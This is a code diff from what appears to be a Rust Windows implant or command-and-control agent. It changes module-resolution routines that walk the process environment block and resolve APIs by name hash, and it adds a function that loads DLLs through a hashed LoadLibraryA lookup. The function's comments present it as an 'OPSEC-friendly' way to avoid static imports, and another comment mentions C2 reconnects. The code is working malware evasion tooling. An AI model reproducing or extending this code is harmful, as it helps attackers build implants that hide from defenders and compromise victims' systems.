@@ -9,12 +9,12 @@ use std::collections::HashMap;
 use std::sync::atomic::{AtomicUsize, Ordering};
 use std::sync::{Mutex, OnceLock};
 
-use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
-#[cfg(target_arch = "x86_64")]
-use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;
+use super::hash_module_name;
 #[cfg(target_arch = "x86")]
 use winapi::um::winnt::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
-use super::hash_module_name;
+#[cfg(target_arch = "x86_64")]
+use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;
+use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
 
 /// Hot-path module base cache (atomic; 0 = unresolved). Arch-independent.
 struct ModuleBaseCache {
@@ -130,8 +130,11 @@ unsafe fn get_module_base_uncached(name_hash: u32) -> usize {
     } as *mut winapi::shared::ntdef::LIST_ENTRY;
     let mut current_node = (*list_head).Flink;
 
+    // NOTE: Do NOT call db_print / format! here.
+    // Release db_print re-enters get_module_base for OutputDebugStringA; combined with
+    // Once::call_once that caused deadlock → agent freeze, no C2 reconnect.
+
     while current_node != list_head {
-        // InMemoryOrderLinks offset: 0x10 (x64) or 0x08 (x86)
         let entry_ptr = if cfg!(target_arch = "x86_64") {
             (current_node as *const u8).sub(16)
         } else {
@@ -153,6 +156,7 @@ unsafe fn get_module_base_uncached(name_hash: u32) -> usize {
                 };
                 h = h.wrapping_mul(31).wrapping_add(lower as u32);
             }
+
             if h == name_hash {
                 return (*entry).dll_base as usize;
             }
@@ -160,7 +164,51 @@ unsafe fn get_module_base_uncached(name_hash: u32) -> usize {
 
         current_node = (*current_node).Flink;
     }
+
     0
+}
+
+/// Resolve module base: PEB first; if not loaded, `LoadLibraryA` via kernel32 then re-walk PEB.
+///
+/// Console agents often have **no user32/gdi32/gdiplus** until first GUI use — pure PEB
+/// returns 0 and callers fail cleanly. This is the correct OPSEC-friendly load path
+/// (still no static IAT for those DLLs).
+///
+/// `dll_name` must be ASCII like `b"user32.dll"` (NUL appended if missing).
+#[cfg(windows)]
+pub unsafe fn ensure_module_base(dll_name: &[u8], name_hash: u32) -> usize {
+    let existing = get_module_base(name_hash);
+    if existing != 0 {
+        return existing;
+    }
+
+    let k32 = get_module_base(super::hash_module_name(b"kernel32.dll"));
+    if k32 == 0 {
+        return 0;
+    }
+    let load_addr = match get_api_addr(k32, super::hash_api_name(b"LoadLibraryA")) {
+        Some(a) => a,
+        None => return 0,
+    };
+    type LoadLibraryAFn = unsafe extern "system" fn(*const i8) -> usize;
+    let load_library: LoadLibraryAFn = std::mem::transmute(load_addr);
+
+    let mut name = Vec::with_capacity(dll_name.len() + 1);
+    name.extend_from_slice(dll_name);
+    if !name.ends_with(&[0]) {
+        name.push(0);
+    }
+    let h = load_library(name.as_ptr() as *const i8);
+    if h == 0 {
+        return 0;
+    }
+    // Re-walk PEB so subsequent get_module_base hits the loaded module
+    let again = get_module_base(name_hash);
+    if again != 0 {
+        again
+    } else {
+        h
+    }
 }
 
 /// Dynamic Export Parsing: Find function address by name hash.
@@ -202,7 +250,9 @@ unsafe fn get_api_addr_uncached(module_ptr: usize, func_hash: u32) -> Option<usi
         let mut h: u32 = 0;
         let mut offset = 0;
         while *name_ptr.add(offset) != 0 {
-            h = h.wrapping_mul(31).wrapping_add(*name_ptr.add(offset) as u8 as u32);
+            h = h
+                .wrapping_mul(31)
+                .wrapping_add(*name_ptr.add(offset) as u8 as u32);
             offset += 1;
         }
 
